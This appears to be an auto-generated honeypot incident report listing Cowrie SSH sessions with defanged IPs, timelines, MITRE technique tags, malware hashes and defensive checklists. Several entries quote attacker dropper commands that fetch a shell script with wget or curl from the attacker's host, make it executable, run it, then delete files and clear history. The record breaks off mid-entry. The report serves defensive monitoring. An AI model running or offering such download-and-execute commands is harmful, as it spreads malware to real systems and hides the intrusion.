
| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:59:52` | `cowrie.session.connect` |
| `2026-06-25 16:59:52` | `cowrie.client.version` |
| `2026-06-25 16:59:52` | `cowrie.client.kex` |
| `2026-06-25 16:59:52` | `cowrie.login.success` |
| `2026-06-25 16:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb3ba229251

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:00 |
| **Last Seen** | 2026-06-25 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:00:42` | `cowrie.session.connect` |
| `2026-06-25 17:00:42` | `cowrie.client.version` |
| `2026-06-25 17:00:42` | `cowrie.client.kex` |
| `2026-06-25 17:00:43` | `cowrie.login.success` |
| `2026-06-25 17:00:44` | `cowrie.session.params` |
| `2026-06-25 17:00:44` | `cowrie.command.input` |
| `2026-06-25 17:00:44` | `cowrie.log.closed` |
| `2026-06-25 17:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc150995b9f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:01 |
| **Last Seen** | 2026-06-25 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:01:37` | `cowrie.session.connect` |
| `2026-06-25 17:01:37` | `cowrie.client.version` |
| `2026-06-25 17:01:37` | `cowrie.client.kex` |
| `2026-06-25 17:01:37` | `cowrie.login.success` |
| `2026-06-25 17:01:38` | `cowrie.session.params` |
| `2026-06-25 17:01:38` | `cowrie.command.input` |
| `2026-06-25 17:01:38` | `cowrie.log.closed` |
| `2026-06-25 17:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb466cba654

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:02 |
| **Last Seen** | 2026-06-25 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:02:31` | `cowrie.session.connect` |
| `2026-06-25 17:02:31` | `cowrie.client.version` |
| `2026-06-25 17:02:31` | `cowrie.client.kex` |
| `2026-06-25 17:02:32` | `cowrie.login.success` |
| `2026-06-25 17:02:32` | `cowrie.session.params` |
| `2026-06-25 17:02:32` | `cowrie.command.input` |
| `2026-06-25 17:02:33` | `cowrie.log.closed` |
| `2026-06-25 17:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7919645cfa0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 17:03 |
| **Last Seen** | 2026-06-25 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:03:15` | `cowrie.session.connect` |
| `2026-06-25 17:03:15` | `cowrie.client.version` |
| `2026-06-25 17:03:15` | `cowrie.client.kex` |
| `2026-06-25 17:03:16` | `cowrie.login.success` |
| `2026-06-25 17:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895bfec3e1e3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 17:03 |
| **Last Seen** | 2026-06-25 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:03:15` | `cowrie.session.connect` |
| `2026-06-25 17:03:15` | `cowrie.client.version` |
| `2026-06-25 17:03:15` | `cowrie.client.kex` |
| `2026-06-25 17:03:16` | `cowrie.login.success` |
| `2026-06-25 17:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e719b8368db

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:03 |
| **Last Seen** | 2026-06-25 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:03:23` | `cowrie.session.connect` |
| `2026-06-25 17:03:23` | `cowrie.client.version` |
| `2026-06-25 17:03:24` | `cowrie.client.kex` |
| `2026-06-25 17:03:24` | `cowrie.login.success` |
| `2026-06-25 17:03:25` | `cowrie.session.params` |
| `2026-06-25 17:03:25` | `cowrie.command.input` |
| `2026-06-25 17:03:25` | `cowrie.log.closed` |
| `2026-06-25 17:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d1aded127b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:04 |
| **Last Seen** | 2026-06-25 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:04:17` | `cowrie.session.connect` |
| `2026-06-25 17:04:17` | `cowrie.client.version` |
| `2026-06-25 17:04:17` | `cowrie.client.kex` |
| `2026-06-25 17:04:18` | `cowrie.login.success` |
| `2026-06-25 17:04:19` | `cowrie.session.params` |
| `2026-06-25 17:04:19` | `cowrie.command.input` |
| `2026-06-25 17:04:19` | `cowrie.log.closed` |
| `2026-06-25 17:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a529cb19248

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 17:04 |
| **Last Seen** | 2026-06-25 17:04 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122/dl.sh; sh dl.sh; rm -fr *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122/dl.sh |
| **Malware Analysis** | 8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:04:35` | `cowrie.session.connect` |
| `2026-06-25 17:04:35` | `cowrie.login.success` |
| `2026-06-25 17:04:36` | `cowrie.session.params` |
| `2026-06-25 17:04:37` | `cowrie.command.input` |
| `2026-06-25 17:04:37` | `cowrie.command.input` |
| `2026-06-25 17:04:37` | `cowrie.session.file_download` |
| `2026-06-25 17:04:52` | `cowrie.log.closed` |
| `2026-06-25 17:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc43aeb659a4

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 17:05 |
| **Last Seen** | 2026-06-25 17:05 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122/dl.sh; sh dl.sh; rm -fr *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122/dl.sh |
| **Malware Analysis** | 8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:05:00` | `cowrie.session.connect` |
| `2026-06-25 17:05:01` | `cowrie.login.success` |
| `2026-06-25 17:05:01` | `cowrie.session.params` |
| `2026-06-25 17:05:03` | `cowrie.command.input` |
| `2026-06-25 17:05:03` | `cowrie.command.input` |
| `2026-06-25 17:05:03` | `cowrie.session.file_download` |
| `2026-06-25 17:05:18` | `cowrie.log.closed` |
| `2026-06-25 17:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef483f9f949e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:05 |
| **Last Seen** | 2026-06-25 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:05:12` | `cowrie.session.connect` |
| `2026-06-25 17:05:12` | `cowrie.client.version` |
| `2026-06-25 17:05:12` | `cowrie.client.kex` |
| `2026-06-25 17:05:13` | `cowrie.login.success` |
| `2026-06-25 17:05:13` | `cowrie.session.params` |
| `2026-06-25 17:05:13` | `cowrie.command.input` |
| `2026-06-25 17:05:14` | `cowrie.log.closed` |
| `2026-06-25 17:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87186817364

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:06 |
| **Last Seen** | 2026-06-25 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:06:08` | `cowrie.session.connect` |
| `2026-06-25 17:06:08` | `cowrie.client.version` |
| `2026-06-25 17:06:08` | `cowrie.client.kex` |
| `2026-06-25 17:06:09` | `cowrie.login.success` |
| `2026-06-25 17:06:10` | `cowrie.session.params` |
| `2026-06-25 17:06:10` | `cowrie.command.input` |
| `2026-06-25 17:06:10` | `cowrie.log.closed` |
| `2026-06-25 17:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7940dd9c9672

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:07 |
| **Last Seen** | 2026-06-25 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:07:04` | `cowrie.session.connect` |
| `2026-06-25 17:07:04` | `cowrie.client.version` |
| `2026-06-25 17:07:04` | `cowrie.client.kex` |
| `2026-06-25 17:07:04` | `cowrie.login.success` |
| `2026-06-25 17:07:05` | `cowrie.session.params` |
| `2026-06-25 17:07:05` | `cowrie.command.input` |
| `2026-06-25 17:07:05` | `cowrie.log.closed` |
| `2026-06-25 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6047563b0b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:07 |
| **Last Seen** | 2026-06-25 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:07:58` | `cowrie.session.connect` |
| `2026-06-25 17:07:58` | `cowrie.client.version` |
| `2026-06-25 17:07:58` | `cowrie.client.kex` |
| `2026-06-25 17:07:58` | `cowrie.login.success` |
| `2026-06-25 17:07:59` | `cowrie.session.params` |
| `2026-06-25 17:07:59` | `cowrie.command.input` |
| `2026-06-25 17:07:59` | `cowrie.log.closed` |
| `2026-06-25 17:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46497394c248

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 17:07 |
| **Last Seen** | 2026-06-25 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:07:59` | `cowrie.session.connect` |
| `2026-06-25 17:07:59` | `cowrie.client.version` |
| `2026-06-25 17:07:59` | `cowrie.client.kex` |
| `2026-06-25 17:08:01` | `cowrie.login.success` |
| `2026-06-25 17:08:02` | `cowrie.session.params` |
| `2026-06-25 17:08:02` | `cowrie.command.input` |
| `2026-06-25 17:08:03` | `cowrie.log.closed` |
| `2026-06-25 17:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f790baa94fc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:08 |
| **Last Seen** | 2026-06-25 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:08:52` | `cowrie.session.connect` |
| `2026-06-25 17:08:52` | `cowrie.client.version` |
| `2026-06-25 17:08:52` | `cowrie.client.kex` |
| `2026-06-25 17:08:52` | `cowrie.login.success` |
| `2026-06-25 17:08:53` | `cowrie.session.params` |
| `2026-06-25 17:08:53` | `cowrie.command.input` |
| `2026-06-25 17:08:53` | `cowrie.log.closed` |
| `2026-06-25 17:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d188a7f5bc5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:09 |
| **Last Seen** | 2026-06-25 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:09:46` | `cowrie.session.connect` |
| `2026-06-25 17:09:46` | `cowrie.client.version` |
| `2026-06-25 17:09:46` | `cowrie.client.kex` |
| `2026-06-25 17:09:47` | `cowrie.login.success` |
| `2026-06-25 17:09:47` | `cowrie.session.params` |
| `2026-06-25 17:09:47` | `cowrie.command.input` |
| `2026-06-25 17:09:47` | `cowrie.log.closed` |
| `2026-06-25 17:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff96bca3f0cb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 17:10 |
| **Last Seen** | 2026-06-25 17:10 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:10:37` | `cowrie.session.connect` |
| `2026-06-25 17:10:38` | `cowrie.client.version` |
| `2026-06-25 17:10:38` | `cowrie.client.kex` |
| `2026-06-25 17:10:45` | `cowrie.login.success` |
| `2026-06-25 17:10:48` | `cowrie.session.params` |
| `2026-06-25 17:10:48` | `cowrie.command.input` |
| `2026-06-25 17:10:49` | `cowrie.log.closed` |
| `2026-06-25 17:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6289d0b8087d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:10 |
| **Last Seen** | 2026-06-25 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:10:40` | `cowrie.session.connect` |
| `2026-06-25 17:10:40` | `cowrie.client.version` |
| `2026-06-25 17:10:41` | `cowrie.client.kex` |
| `2026-06-25 17:10:41` | `cowrie.login.success` |
| `2026-06-25 17:10:42` | `cowrie.session.params` |
| `2026-06-25 17:10:42` | `cowrie.command.input` |
| `2026-06-25 17:10:42` | `cowrie.log.closed` |
| `2026-06-25 17:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ee83518b27

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:11 |
| **Last Seen** | 2026-06-25 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:11:36` | `cowrie.session.connect` |
| `2026-06-25 17:11:36` | `cowrie.client.version` |
| `2026-06-25 17:11:36` | `cowrie.client.kex` |
| `2026-06-25 17:11:36` | `cowrie.login.success` |
| `2026-06-25 17:11:37` | `cowrie.session.params` |
| `2026-06-25 17:11:37` | `cowrie.command.input` |
| `2026-06-25 17:11:37` | `cowrie.log.closed` |
| `2026-06-25 17:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425  (Bash Script)
   SHA256: bcc130d7635ef1ef7350d3135bf3e4abb606dce75f197263...
   Score : 74/100  |  VT: 35/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-46b28c3bacc3

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 17:12 |
| **Last Seen** | 2026-06-25 17:12 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://51.158.248[.]122:8517/dropper.sh; curl -O hxxp://51.158.248[.]122:8517/dropper.sh; chmod 777 bins.sh; sh bins.sh;  rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/dropper.sh, hxxp://51.158.248[.]122:8517/dropper.sh |
| **Malware Analysis** | bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:12:14` | `cowrie.session.connect` |
| `2026-06-25 17:12:15` | `cowrie.login.success` |
| `2026-06-25 17:12:15` | `cowrie.session.params` |
| `2026-06-25 17:12:17` | `cowrie.command.input` |
| `2026-06-25 17:12:17` | `cowrie.command.input` |
| `2026-06-25 17:12:17` | `cowrie.session.file_download` |
| `2026-06-25 17:12:17` | `cowrie.session.file_download` |
| `2026-06-25 17:12:32` | `cowrie.log.closed` |
| `2026-06-25 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80512dc2c234

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:12 |
| **Last Seen** | 2026-06-25 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:12:32` | `cowrie.session.connect` |
| `2026-06-25 17:12:32` | `cowrie.client.version` |
| `2026-06-25 17:12:32` | `cowrie.client.kex` |
| `2026-06-25 17:12:32` | `cowrie.login.success` |
| `2026-06-25 17:12:33` | `cowrie.session.params` |
| `2026-06-25 17:12:33` | `cowrie.command.input` |
| `2026-06-25 17:12:33` | `cowrie.log.closed` |
| `2026-06-25 17:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425  (Bash Script)
   SHA256: bcc130d7635ef1ef7350d3135bf3e4abb606dce75f197263...
   Score : 74/100  |  VT: 35/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-b9b928b1cb19

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 17:12 |
| **Last Seen** | 2026-06-25 17:12 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://51.158.248[.]122:8517/dropper.sh; curl -O hxxp://51.158.248[.]122:8517/dropper.sh; chmod 777 bins.sh; sh bins.sh;  rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/dropper.sh, hxxp://51.158.248[.]122:8517/dropper.sh |
| **Malware Analysis** | bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:12:40` | `cowrie.session.connect` |
| `2026-06-25 17:12:40` | `cowrie.login.success` |
| `2026-06-25 17:12:41` | `cowrie.session.params` |
| `2026-06-25 17:12:42` | `cowrie.command.input` |
| `2026-06-25 17:12:42` | `cowrie.command.input` |
| `2026-06-25 17:12:42` | `cowrie.session.file_download` |
| `2026-06-25 17:12:43` | `cowrie.session.file_download` |
| `2026-06-25 17:12:57` | `cowrie.log.closed` |
| `2026-06-25 17:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d63de5f8fec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:13 |
| **Last Seen** | 2026-06-25 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:13:29` | `cowrie.session.connect` |
| `2026-06-25 17:13:29` | `cowrie.client.version` |
| `2026-06-25 17:13:30` | `cowrie.client.kex` |
| `2026-06-25 17:13:30` | `cowrie.login.success` |
| `2026-06-25 17:13:31` | `cowrie.session.params` |
| `2026-06-25 17:13:31` | `cowrie.command.input` |
| `2026-06-25 17:13:32` | `cowrie.log.closed` |
| `2026-06-25 17:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def0e8247782

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:14 |
| **Last Seen** | 2026-06-25 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
